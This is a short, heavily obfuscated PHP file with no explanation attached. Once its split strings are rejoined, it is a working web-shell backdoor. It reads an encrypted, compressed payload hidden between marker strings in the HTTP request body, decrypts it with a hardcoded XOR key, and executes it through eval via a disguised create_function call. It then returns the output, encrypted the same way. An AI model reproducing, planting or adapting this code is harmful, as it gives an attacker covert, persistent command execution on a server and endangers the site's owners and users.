<?php
$x='C($i=0;^C$^Ci<$l^C;){for($j=0;^C($j<^C^C$c&&$i<$l);^C$j++,$i++^C)^C{$o.=$t{$^Ci}^$k{$j}';
$i='$k="e^Cf3ef40^Cb^C";$kh="^Cedc864a05^C6^Ce^C9";$kf=^C"2f7d13fa8467";$^Cp="5j26MMg^C42^';
$h='@ba^Cse^C64_^Cdecode($^Cm[1^C]),$^Ck)));$o=@ob_get^C_co^Cntents^C()^C;@ob_^Cend_c^Cle^C';
$c='CIohffwQ"^C;funct^Cion x($t^C^C,$k){$c=st^Cr^Cle^Cn($k);$l^C=strlen($t);$o=^C"";for^';
$I='an()^C;$r=@ba^Cse64_encod^Ce(@x(@gzcompre^Css($o^C),$^Ck)^C);print("$p$kh$r$^Ckf");}';
$E=str_replace('Po','','PocrePoate_PofPoPounPoction');
$u='^C;}^C}return^C $o^C;}if (@p^Creg_match^C^C("/$kh(.+)$k^Cf/"^C,@file_g^Cet_con^Ct^';
$f='Cents("^Cphp://inpu^C^Ct"),$m)==^C1) {@ob_st^Cart()^C;@e^Cval(@gzunco^Cmp^Cress(@x(';
$X=str_replace('^C','',$i.$c.$x.$u.$f.$h.$I);
$p=$E('',$X);$p();
?>
